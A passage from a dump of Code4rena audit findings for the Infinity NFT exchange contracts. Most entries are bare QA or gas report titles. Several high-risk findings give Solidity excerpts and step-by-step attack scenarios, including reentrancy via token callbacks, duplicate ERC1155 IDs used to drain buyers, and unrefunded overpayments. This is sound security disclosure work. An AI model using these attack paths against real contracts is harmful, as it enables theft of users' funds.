{           ++j;         }       }        isOrdersTimeValid =         isOrdersTimeValid &&         manyMakerOrders[i].constraints[3] <= block.timestamp &&         manyMakerOrders[i].constraints[4] >= block.timestamp;        itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);        unchecked {         ++i;       }     }      bool _isTimeValid = isOrdersTimeValid &&       makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp;      uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);     uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);      bool _isPriceValid = false;     if (makerOrder.isSellOrder) {       _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;     } else {       _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;     }      return (numItems == makerOrder.constraints[0]) && _isTimeValid && itemsIntersect && _isPriceValid;   } ```  However, because `buy.nfts` is used as `OrderItem` to transfer the nfts from seller to buyer, and there are no tokenIds specified in the matched maker buy order, the buyer wont receive any nft (`_transferERC721s` does nothing, 0 transfers) despite the buyer paid full in price.  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L763-L786  ```solidity function _execMatchOneMakerSellToManyMakerBuys(     bytes32 sellOrderHash,     bytes32 buyOrderHash,     OrderTypes.MakerOrder calldata sell,     OrderTypes.MakerOrder calldata buy,     uint256 startGasPerOrder,     uint256 execPrice,     uint16 protocolFeeBps,     uint32 wethTransferGasUnits,     address weth   ) internal {     isUserOrderNonceExecutedOrCancelled[buy.signer][buy.constraints[5]] = true;     uint256 protocolFee = (protocolFeeBps * execPrice) / 10000;     uint256 remainingAmount = execPrice - protocolFee;     _execMatchOneToManyOrders(sell.signer, buy.signer, buy.nfts, buy.execParams[1], remainingAmount);     _emitMatchEvent(       sellOrderHash,       buyOrderHash,       sell.signer,       buy.signer,       buy.execParams[0],       buy.execParams[1],       execPrice     ); ```  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1080-L1092  ```solidity function _transferERC721s(     address from,     address to,     OrderTypes.OrderItem calldata item   ) internal {     uint256 numTokens = item.tokens.length;     for (uint256 i = 0; i < numTokens; ) {       IERC721(item.collection).safeTransferFrom(from, to, item.tokens[i].tokenId);       unchecked {         ++i;       }     }   } ```   ### PoC  1. Alice signed and submitted a maker buy order #1, to buy `2` Punk with `2 WETH` and specified tokenIds = `1`,`2` 2. Bob signed and submitted a maker buy order #2, to buy `1` Punk with `1 WETH` and with no specified tokenIds. 3. Charlie signed and submitted a maker sell order #3, ask for `3 WETH` for `2` Punk and specified tokenIds = `1`,`2` 4. The match executor called `matchOneToManyOrders()` match Charlie's sell order #3 with buy order #1 and #2, Alice received `2` Punk, Charlie received `3 WETH`, Bob paid `1 WETH` and get nothing in return.  ### Recommendation  Change to:  ```solidity function canExecMatchOneToMany(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external view override returns (bool) {     uint256 numItems;     uint256 numConstructedItems;     bool isOrdersTimeValid = true;     bool itemsIntersect = true;     uint256 ordersLength = manyMakerOrders.length;     for (uint256 i = 0; i < ordersLength; ) {       if (!isOrdersTimeValid || !itemsIntersect) {         return false; // short circuit       }        numConstructedItems += manyMakerOrders[i].constraints[0];        uint256 nftsLength = manyMakerOrders[i].nfts.length;       for (uint256 j = 0; j < nftsLength; ) {         numItems += manyMakerOrders[i].nfts[j].tokens.length;         unchecked {           ++j;         }       }        isOrdersTimeValid =         isOrdersTimeValid &&         manyMakerOrders[i].constraints[3] <= block.timestamp &&         manyMakerOrders[i].constraints[4] >= block.timestamp;        itemsIntersect = itemsIntersect && doItemsIntersect(makerOrder.nfts, manyMakerOrders[i].nfts);        unchecked {         ++i;       }     }      bool _isTimeValid = isOrdersTimeValid &&       makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp;      uint256 currentMakerOrderPrice = _getCurrentPrice(makerOrder);     uint256 sumCurrentOrderPrices = _sumCurrentPrices(manyMakerOrders);      bool _isPriceValid = false;     if (makerOrder.isSellOrder) {       _isPriceValid = sumCurrentOrderPrices >= currentMakerOrderPrice;     } else {       _isPriceValid = sumCurrentOrderPrices <= currentMakerOrderPrice;     }      return (numItems == makerOrder.constraints[0]) && (numConstructedItems == numItems) && _isTimeValid && itemsIntersect && _isPriceValid;   } ```  "}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/253", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/247", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Overpayment of native ETH is not refunded to buyer", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/244", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L119-L121 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L1228-L1232   # Vulnerability details  `InfinityExchange` accepts payments in native ETH, but does not return overpayments to the buyer. Overpayments are likely in the case of auction orders priced in native ETH.  In the case of a Dutch or reverse Dutch auction priced in native ETH, the end user is likely to send more ETH than the final calculated price in order to ensure their transaction succeeds, since price is a function of `block.timestamp`, and the user cannot predict the timestamp at which their transaction will be included.   In a Dutch auction, final price may decrease below the calculated price at the time the transaction is sent. In a reverse Dutch auction, the price may increase above the calculated price by the time a transaction is included, so the buyer is incentivized to provide additional ETH in case the price rises while their transaction is waiting for inclusion.  The `takeOrders` and `takeMultipleOneOrders` functions both check that the buyer has provided an ETH amount greater than or equal to the total price at the time of execution:  [`InfinityExchange#takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L359-L363)  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  [`InfinityExchange#takeMultipleOneOrders`](https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L323-L327)  ```solidity     // check to ensure that for ETH orders, enough ETH is sent     // for non ETH orders, IERC20 safeTransferFrom will throw error if insufficient amount is sent     if (isMakerSeller && currency == address(0)) {       require(msg.value >= totalPrice, 'invalid total price');     } ```  However, neither of these functions refunds the user in the case of overpayment. Instead, overpayment amounts will accrue in the contract balance.  Moreover, since there is a bug in `rescueETH` that prevents ether withdrawals from `InfinityExchange`, these overpayments will be locked permanently: the owner cannot withdraw and refund overpayments manually.  Scenario: - Alice creates a sell order for her token with constraints that set up a reverse Dutch auction: start price `500`, end price `2000`, start time `1`, end time `5`. - Bob fills the order at time `2`. The calculated price is `875`. Bob is unsure when his transaction will be included, so provides a full `2000` wei payment. - Bob's transaction is included at time `3`. The calculated price is `1250`. - Bob's additional `750` wei are locked in the contract and not refunded.  Suggestion: Calculate and refund overpayment amounts to callers.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/242", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/240", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/239", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/237", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/236", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/235", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/234", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/232", "labels": ["bug", "QA (Quality Assurance)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/219", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/218", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/217", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/216", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Unnecessary receive() and fallback() functions", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/209", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Unnecessary receive() and fallback() functions"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/207", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Governance may allow admin/owner to dramatically inflate supply and rug pull token users", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/202", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Governance may allow admin/owner to dramatically inflate supply and rug pull token users"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/200", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/199", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/192", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/187", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/186", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/185", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Reentrancy from matchOneToManyOrders", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/184", "labels": ["bug", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L178 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L216 https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L230   # Vulnerability details  `matchOneToManyOrders` doesn't conform to Checks-Effects-Interactions pattern, and updates the maker order nonce only after the NFTs and payment have been sent. Using this, a malicious user can re-enter the contract and re-fulfill the order using `takeOrders`.  ## Impact Orders can be executed twice. User funds would be lost.  ## Proof of Concept `matchOneToManyOrders` will set the order nonce as used only after the tokens are being sent: ```   function matchOneToManyOrders(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.MakerOrder[] calldata manyMakerOrders) external {     ...     if (makerOrder.isSellOrder) {       for (uint256 i = 0; i < ordersLength; ) {         ...         _matchOneMakerSellToManyMakerBuys(...); // @audit will transfer tokens in here         ...       }       //@audit setting nonce to be used only here       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;     } else {       for (uint256 i = 0; i < ordersLength; ) {         protocolFee += _matchOneMakerBuyToManyMakerSells(...); // @audit will transfer tokens in here         ...       }       //@audit setting nonce to be used only here       isUserOrderNonceExecutedOrCancelled[makerOrder.signer][makerOrder.constraints[5]] = true;       ...   } ```  So we can see that tokens are being transferred before nonce is being set to executed.  Therefore, POC for an attack - Alice wants to buy 2 unspecified WolfNFT, and she will pay via AMP, an ERC-777 token. Malicious user Bob will set up an offer to sell 2 WolfNFT. The MATCH_EXECUTOR will match the offers. Bob will set up a contract such that upon receiving of AMP, it will call [`takeOrders`](https://github.com/code-423n4/2022-06-infinity/blob/main/contracts/core/InfinityExchange.sol#L336) with Alice's order, and 2 other WolfNFTs. (Note that although `takeOrders` is `nonReentrant`, `matchOneToManyOrders` is not, and so the reentrancy will succeed.)  So in `takeOrders`, the contract will match Alice's order with Bob's NFTs, and then set Alice's order's nonce to true, then `matchOneToManyOrders` execution will resume, and again will set Alice's order's nonce to true.  Alice ended up buying 4 WolfNFTs although she only signed an order for 2. Tough luck, Alice.  (Note: a similar attack can be constructed via ERC721's onERC721Received.)  ## Recommended Mitigation Steps Conform to CEI and set the nonce to true before executing external calls.  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/183", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Vesting time thresholds have wrong values.", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/182", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor disputed"], "target": "2022-06-infinity-findings", "body": "Vesting time thresholds have wrong values."}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/175", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/172", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/171", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/170", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Unexpected behaviour in function `getUserStakeLevel` if stake thresholds is not ascending", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/169", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "Unexpected behaviour in function `getUserStakeLevel` if stake thresholds is not ascending"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/166", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/165", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Sellers may lose NFTs when orders is matched with `matchOrders()`", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/164", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L205   # Vulnerability details  ## Impact  Function `matchOrders` uses custom constraints to make the matching more flexible, allow seller/buyer to specify maximum/minimum number of NFTs they want to sell/buy. This function first does some checks and then execute matching.  But in [function](https://github.com/infinitydotxyz/exchange-contracts-v2/blob/c51b7e8af6f95cc0a3b5489369cbc7cee060434b/contracts/core/InfinityOrderBookComplication.sol#L192) `areNumItemsValid()`, there is a wrong checking will lead to wrong logic in `matchOrders()` function.  Instead of checking if `numConstructedItems <= sell.constraints[0]` or not, function `areNumItemsValid()` check if `buy.constraints[0] <= sell.constraints[0]`. It will lead to the scenario that `numConstructedItems > sell.constraints[0]` and make the seller sell more number of nfts than he/she allow.    ## Proof of concept   Consider the scenario 1. Alice create a sell order to sell maximum 2 in her 3 BAYC with ids `[1, 2, 3]`  2. Bob create a buy order to buy mimimum any 2 BAYC with id in list `[1, 2, 3]` 3. Match executor call `matchOrders()` to match Alice's order and Bob's one with parameter `constructs = [1, 2, 3]`  4. Function `matchOrders` will transfer all NFT in `construct` list (3 NFTs `1, 2, 3`) from seller to buyer even though seller only want to sell maximum 2 NFTs.  For more information, please check this PoC.  https://gist.github.com/minhquanym/a95c8652de8431c5d1d24aa4076a1878           ## Tools Used  hardhat, chai      ## Recommended Mitigation Steps  Replace check `buy.constraints[0] <= sell.constraints[0]` with `numConstructedItems <= sell.constraints[0]`  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/161", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/160", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/154", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/152", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/151", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "updateStakeLevelThreshold should check that new threshold is within range", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/150", "labels": ["bug", "disagree with severity", "QA (Quality Assurance)", "sponsor acknowledged"], "target": "2022-06-infinity-findings", "body": "updateStakeLevelThreshold should check that new threshold is within range"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/148", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/146", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/144", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/140", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/139", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/138", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "Lose of funds in matchOneToManyOrders() and takeOrders() and matchOrders() because code don't check that different ids in one collection are different, so it's possible to sell one id multiple time instead of selling multiple id one time in one collection of order (lack of checks in doTokenIdsIntersect() especially for ERC1155 tokens)", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/135", "labels": ["bug", "duplicate", "3 (High Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L271-L312 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L59-L116 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L245-L294 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L118-L143 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L330-L364 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L934-L951 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityOrderBookComplication.sol#L145-L164 https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L171-L243   # Vulnerability details  ## Impact Function `matchOneToManyOrders()` and `takeOrders()` and `matchOrders()` suppose to match `sell order` to `buy order` and should perform some checks to ensure that user specified parameters in orders which are signed are not violated when order matching happens. but There is no check in their execution flow to check that an `order` has different `NFT token ids` in each one of it's collections, so even so number of tokens could be valid in `order` to `order` transfer but the number of real transferred tokens and their IDs can be different than what user specified and signed. and user funds would be lost. (because of `ERC1155` there can be more than one token for a `tokenId`, so it would be possible to transfer it)  ## Proof of Concept This is `_takeOrders()` and `` and `` code: ```   /**    * @notice Internal helper function to take orders    * @dev verifies whether order can be executed    * @param makerOrder the maker order    * @param takerItems nfts to be transferred    * @param execPrice execution price    */   function _takeOrders(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.OrderItem[] calldata takerItems,     uint256 execPrice   ) internal {     bytes32 makerOrderHash = _hash(makerOrder);     bool makerOrderValid = isOrderValid(makerOrder, makerOrderHash);     bool executionValid = IComplication(makerOrder.execParams[0]).canExecTakeOrder(makerOrder, takerItems);     require(makerOrderValid && executionValid, 'order not verified');     _execTakeOrders(makerOrderHash, makerOrder, takerItems, makerOrder.isSellOrder, execPrice);   } ``` As you can see it uses `canExecTakeOrder()` to check that it is valid to perform matching. This is `canExecTakeOrder()` and `areTakerNumItemsValid()` and `doTokenIdsIntersect()` code which are used in execution flow to check orders and matching validity: ```   /**    * @notice Checks whether take orders with a higher order intent can be executed    * @dev This function is called by the main exchange to check whether take orders with a higher order intent can be executed.           It checks whether orders have the right constraints - i.e they have the right number of items, whether time is still valid           and whether the nfts intersect    * @param makerOrder the maker order    * @param takerItems the taker items specified by the taker    * @return returns whether order can be executed    */   function canExecTakeOrder(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)     external     view     override     returns (bool)   {     return (makerOrder.constraints[3] <= block.timestamp &&       makerOrder.constraints[4] >= block.timestamp &&       areTakerNumItemsValid(makerOrder, takerItems) &&       doItemsIntersect(makerOrder.nfts, takerItems));   }    /// @dev sanity check to make sure that a taker is specifying the right number of items   function areTakerNumItemsValid(OrderTypes.MakerOrder calldata makerOrder, OrderTypes.OrderItem[] calldata takerItems)     public     pure     returns (bool)   {     uint256 numTakerItems = 0;     uint256 nftsLength = takerItems.length;     for (uint256 i = 0; i < nftsLength; ) {       unchecked {         numTakerItems += takerItems[i].tokens.length;         ++i;       }     }     return makerOrder.constraints[0] == numTakerItems;   }    /**    * @notice Checks whether tokenIds intersect    * @dev This function checks whether there are intersecting tokenIds between two order items    * @param item1 first item    * @param item2 second item    * @return returns whether tokenIds intersect    */   function doTokenIdsIntersect(OrderTypes.OrderItem calldata item1, OrderTypes.OrderItem calldata item2)     public     pure     returns (bool)   {     uint256 item1TokensLength = item1.tokens.length;     uint256 item2TokensLength = item2.tokens.length;     // case where maker/taker didn't specify any tokenIds for this collection     if (item1TokensLength == 0 || item2TokensLength == 0) {       return true;     }     uint256 numTokenIdsPerCollMatched = 0;     for (uint256 k = 0; k < item2TokensLength; ) {       for (uint256 l = 0; l < item1TokensLength; ) {         if (           item1.tokens[l].tokenId == item2.tokens[k].tokenId && item1.tokens[l].numTokens == item2.tokens[k].numTokens         ) {           // increment numTokenIdsPerCollMatched           unchecked {             ++numTokenIdsPerCollMatched;           }           // short circuit           break;         }         unchecked {           ++l;         }       }       unchecked {         ++k;       }     }      return numTokenIdsPerCollMatched == item2TokensLength;   } ``` As you can see there is no logic to check that `token IDs` in one collection of order are different and code only checks that total number of tokens in one `order` matches the number of tokens specified and the ids in one order exists in other list defined. function `doTokenIdsIntersect()` checks to see that `tokens ids` in one collection can match list of specified tokens. because of this check lacking there are some scenarios that can cause fund lose for `ERC1155` tokens (normal `ERC721` requires more strange conditions). here is first example:  1. for simplicity let's assume collection and timestamp are valid and match for orders and token is `ERC1155` 2. `user1` has signed this order: A:`(user1 BUY 3 NFT IDs[(1,1),(2,1),(3,1)] at 15 ETH)` (buy `1` token of each `id=1,2,3`) 3. `NFT ID[1]` fair price is `1 ETH`, `NFT ID[2]` fair price is `2 ETH`, `NFT ID[3]` fair price is `12 ETH` 4. `attacker` who has 3 of `NFT ID[1]` create this list: B:`(NFT IDs[(1,1), (1,1), (1,1)] )` (list to trade `1`token of `id=1` for 3 times) 5. attacker call `takeOrders()` with this parameters: makerOrder: A , takerNfts: B 6. contract logic would check all the conditions and validate and verify orders and their matching (they intersect and total number of token to sell is equal to total number of tokens to buy and all of the B list is inside A list) and perform the transaction. 7. `attacker` would receive `15 ETH` for his 3 token of `NFT ID[1]` and steal `user1` funds. `user1` would receive 3 of `NFT ID[1]` and pays `15 ETH` and even so his order A has been executed he doesn't receive `NFT IDs[(2,1),(3,1)]` and contract would violates his signed parameters.  This examples shows that in verifying one to many order code should verify that one order's one  collection's token ids are not duplicates. (the function `doTokenIdsIntersect()` doesn't check for this).  This scenario is performable to `matchOneToManyOrders()` and `matchOrders()` and but exists in their code (related check logics) too. more important things about this scenario is that it doesn't require off-chain maching engine to make mistake or malicious act, anyone can call `takeOrders()` if NFT tokens are `ERC1155`. for other `NFT` tokens to perform this attack it requires that `seller==buyer` or some other strange cases (like auto selling when receiving in one contract).  ## Tools Used VIM  ## Recommended Mitigation Steps add checks to ensure `order`'s one `collection`'s token ids are not duplicate in `doTokenIdsIntersect()`  "}, {"title": "Gas Optimizations", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/133", "labels": ["bug", "G (Gas Optimization)"], "target": "2022-06-infinity-findings", "body": "Gas Optimizations"}, {"title": "QA Report", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/132", "labels": ["bug", "QA (Quality Assurance)"], "target": "2022-06-infinity-findings", "body": "QA Report"}, {"title": "fund lose or griefing in all order matching functions [matchOneToOneOrders(), matchOneToManyOrders(), matchOrders(), takeMultipleOneOrders(), takeOrders()] because condition (seller != buyer ) is not checked in any of them", "html_url": "https://github.com/code-423n4/2022-06-infinity-findings/issues/130", "labels": ["bug", "2 (Med Risk)", "sponsor confirmed"], "target": "2022-06-infinity-findings", "body": "# Lines of code  https://github.com/code-423n4/2022-06-infinity/blob/765376fa238bbccd8b1e2e12897c91098c7e5ac6/contracts/core/InfinityExchange.sol#L125-L364   # Vulnerability details  ## Impact Functions `matchOneToOneOrders()`, `matchOneToManyOrders()`, `matchOrders()`, `takeMultipleOneOrders()`, `takeOrders()` are for order matching and order execution and they validate different things about orders but there is no check for that `seller != buyer`, which can cause wrong order matching resulting in fund lose or fund theft or griefing. (it can be combined with other vulns to perform more damaging attacks)  ## Proof of Concept We only give proof of concept for `matchOneToManyOrders()` and other order execution/matching functions has similar bugs which root cause is not checking `seller != buyer`. This is `matchOneToManyOrders()` code: ```   /**    @notice Matches one  order to many orders. Example: A buy order with 5 specific NFTs with 5 sell orders with those specific NFTs.    @dev Can only be called by the match executor. Refunds gas cost incurred by the         match executor to this contract. Checks whether the given complication can execute the match.    @param makerOrder The one order to match    @param manyMakerOrders Array of multiple orders to match the one order against   */   function matchOneToManyOrders(     OrderTypes.MakerOrder calldata makerOrder,     OrderTypes.MakerOrder[] calldata manyMakerOrders   ) external {     uint256 startGas = gasleft();     require(msg.sender == MATCH_EXECUTOR, 'OME');     require(_complications.contains(makerOrder.execParams[0]), 'invalid complication');     require(       IComplication(makerOrder.execParams[0]).canExecMatchOneToMany(makerOrder, manyMakerOrders),       'cannot execute'     );     bytes32 makerOrderHash = _hash(makerOrder);     require(isOrderValid(makerOrder, makerOrderHash), 'invalid maker order');     uint256 ordersLength = 